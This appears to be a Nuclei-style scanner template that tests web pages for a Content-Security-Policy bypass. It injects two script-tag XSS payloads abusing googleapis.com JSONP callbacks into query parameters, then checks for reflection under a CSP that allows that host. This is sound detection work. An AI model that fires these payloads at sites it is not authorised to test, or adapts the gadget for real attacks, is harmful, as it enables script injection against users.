id: googleapis-csp-xss

info:
  name: Content-Security-Policy Bypass via GoogleAPIS
  author: DhiyaneshDK
  severity: high
  reference:
    - https://github.com/honoki/CSPBypass/blob/c7e4344226a58d96ad16a99d4446f81cd663264e/data.tsv#L188
    - https://github.com/honoki/CSPBypass/blob/c7e4344226a58d96ad16a99d4446f81cd663264e/data.tsv#L189C5-L189C19
  metadata:
    verified: true
  tags: xss,csp-bypass,googleapis

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert()"></script>'
        - '<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{injection}}"

      - type: word
        part: content_type
        words:
          - "text/html"

      - type: word
        part: content_security_policy
        words:
          - "googleapis.com"
          - "script-src"
        condition: and